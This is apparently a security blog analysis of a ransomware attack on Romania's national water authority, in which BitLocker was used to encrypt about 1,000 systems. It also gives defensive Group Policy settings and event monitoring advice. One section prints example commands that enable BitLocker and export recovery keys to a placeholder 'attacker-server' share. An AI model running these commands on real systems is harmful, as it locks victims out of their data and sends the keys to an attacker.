Romania Water Authority Ransomware Attack: 1,000 Systems Encrypted Using BitLocker

Threat actors weaponize Windows' own encryption tool against Romania's national water authority, exposing critical infrastructure vulnerabilities across Eastern Europe.

Attack: December 2025 Published: Dec 25, 2025 18 min read
Critical Infrastructure Attack: This attack on Romania's national water authority represents a significant escalation in ransomware targeting of critical infrastructure. While operational technology remained unaffected, approximately 1,000 IT systems were encrypted using living-off-the-land techniques.

Executive Summary

In December 2025, Romania's national water authority, Administrația Națională Apele Române (ANAR), fell victim to a devastating ransomware attack that compromised approximately 1,000 systems. What makes this attack particularly notable is the attackers' use of BitLocker—Windows' built-in encryption tool—to encrypt files and demand ransom, exemplifying the growing "Living Off the Land" (LOTL) trend in ransomware operations.

The attack targeted IT infrastructure rather than operational technology (OT), meaning that hydrotechnical structures—dams, reservoirs, and water treatment facilities—remained operational. However, the incident highlights the precarious state of critical infrastructure cybersecurity in Eastern Europe and the potential consequences when IT/OT segmentation is not properly implemented.

About the Target: ANAR

Administrația Națională Apele Române (ANAR) is Romania's national water management authority, responsible for:

  • Water resource management: Managing Romania's rivers, lakes, and groundwater systems
  • Flood control: Operating dams, levees, and flood prevention infrastructure
  • Water quality monitoring: Environmental protection and pollution control
  • Hydrotechnical infrastructure: Maintaining hundreds of dams and water control structures
  • Permit issuance: Regulating water usage for industrial and agricultural purposes

ANAR operates across Romania's entire territory, with regional branches managing local water resources. The organization is classified as critical national infrastructure under Romanian and EU law, making this attack particularly concerning from a national security perspective.

Technical Analysis: BitLocker as a Weapon

The Living Off the Land Approach

The attackers' use of BitLocker represents a sophisticated "Living Off the Land" (LOTL) technique. Rather than deploying custom ransomware that might be detected by security tools, the attackers weaponized a legitimate Windows feature that:

  • Is already present on all modern Windows systems - No need to download malware
  • Is signed by Microsoft - Trusted by security tools
  • Provides strong encryption - AES-256, virtually unbreakable without the key
  • Integrates with Active Directory - Can be deployed at scale via Group Policy
What is LOTL? Living Off the Land refers to techniques where attackers use legitimate tools already present on target systems rather than bringing in external malware. This approach evades detection because the tools being used are inherently trusted.

Likely Attack Chain

While specific details of the ANAR attack haven't been publicly disclosed, BitLocker-based ransomware attacks typically follow this pattern:

  1. Initial Access: Likely through phishing, exposed RDP, or VPN vulnerability exploitation
  2. Privilege Escalation: Gaining Domain Admin or equivalent privileges
  3. Reconnaissance: Mapping the network and identifying high-value targets
  4. Persistence: Establishing backdoor access for continued control
  5. Disabling Defenses: Turning off security tools that might interfere
  6. BitLocker Deployment: Using Group Policy or scripting to enable BitLocker across systems
  7. Key Exfiltration: Capturing recovery keys before locking systems
  8. Encryption: Systems encrypted with attacker-controlled keys
  9. Ransom Demand: Victims contacted with payment demands

BitLocker Attack Methodology

The technical execution of a BitLocker-based attack might include commands like:

# Enable BitLocker on C: drive with random password
manage-bde -on C: -RecoveryPassword -Used

# Or via PowerShell for mass deployment
Enable-BitLocker -MountPoint "C:" -EncryptionMethod Aes256 -UsedSpaceOnly -RecoveryPasswordProtector

# Export recovery key to attacker-controlled location
manage-bde -protectors -get C: > \\attacker-server\keys\%COMPUTERNAME%.txt

Once BitLocker is enabled and the system reboots, the recovery key is required to access data. If the attacker controls the only copy of the recovery key, the victim has no choice but to pay or lose their data.

Critical Infrastructure Defense Gap

ANAR's IT systems were reportedly not protected by Romania's national defense cyber system. This reveals a significant gap in how critical infrastructure cybersecurity is managed in Romania and potentially other countries:

  • Critical infrastructure IT systems may not receive the same protection as government networks
  • Sector-specific agencies may be responsible for their own cybersecurity
  • Resource and budget constraints affect security implementations
  • Lack of centralized visibility into critical infrastructure security posture
"The incident highlights that critical infrastructure cannot rely solely on IT/OT segmentation. If IT systems are compromised, operational disruption is inevitable even if OT remains safe." — TheHGTech Analysis

Geopolitical Context

Romania as a Target

Romania has become an increasingly attractive target for cyberattacks due to several factors:

  • NATO membership: As a NATO member, Romania hosts military installations including the Aegis Ashore missile defense system
  • Ukraine border: Romania shares a border with Ukraine and has been a key logistics hub during the ongoing conflict
  • EU membership: Access to EU systems and databases makes Romanian infrastructure valuable
  • Black Sea access: Strategic importance of Black Sea ports and infrastructure

Attribution Considerations

While no threat actor has been publicly attributed to this attack, several possibilities exist:

  • Financially motivated cybercriminals: Ransomware groups targeting critical infrastructure for payment
  • Hacktivist groups: Pro-Russian hacktivist groups have targeted Romanian infrastructure previously
  • State-sponsored actors: Nation-state actors using ransomware as cover for destructive operations

The Danish Defence Intelligence Service recently attributed attacks on water utilities and DDoS attacks on Danish websites to pro-Russian hacktivist groups, suggesting a pattern of Eastern European water infrastructure targeting.

Why Water Utilities Are Targeted

  • Essential service: Water is critical—creating pressure to pay quickly
  • Limited budgets: Water utilities often have less security funding than other sectors
  • Legacy systems: Aging infrastructure with known vulnerabilities
  • Fragmented security: Many utilities lack dedicated cybersecurity staff
  • Public impact: Disruption creates immediate public and political pressure

Defense Recommendations

For Critical Infrastructure Operators:
  1. Implement IT/OT Segmentation: Ensure operational technology is isolated from IT networks
  2. Control BitLocker: Use Group Policy to prevent unauthorized BitLocker activation
  3. Backup Recovery Keys: Centralize BitLocker key management with proper access controls
  4. Monitor for LOTL: Detect suspicious use of legitimate Windows tools
  5. Air-Gap Critical Controls: Ensure manual override capabilities for essential operations
  6. Incident Response Plans: Develop and test plans specific to ransomware scenarios

Preventing BitLocker Abuse

Organizations can implement several controls to prevent BitLocker from being weaponized:

1. Group Policy Controls

Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption
- Require additional authentication at startup: Enabled
- Store BitLocker recovery information in AD DS: Enabled
- Do not enable BitLocker until recovery information is stored: Enabled

2. Monitor BitLocker Events

Key Windows Event IDs to monitor:

  • Event ID 768: BitLocker protection enabled
  • Event ID 771: BitLocker protection disabled
  • Event ID 778: BitLocker recovery key exported

3. Privileged Access Management

Restrict who can enable BitLocker and access recovery keys through proper PAM implementation.

Lessons for Other Critical Infrastructure

1. IT Security Is Critical Infrastructure Security

Even with proper IT/OT segmentation, compromised IT systems lead to operational disruptions. Administrative functions, communications, and monitoring all depend on IT.

2. LOTL Attacks Are Extremely Effective

Using legitimate tools like BitLocker bypasses many traditional security controls. Organizations must monitor for suspicious use of trusted applications.

3. National Cyber Defense Must Cover All Critical Infrastructure

ANAR's systems weren't under Romania's national cyber defense umbrella. This gap exists in many countries and must be addressed.

4. Manual Fallback Procedures Are Essential

ANAR's ability to continue operations manually demonstrates the importance of offline procedures. Critical infrastructure must be able to operate without IT systems.
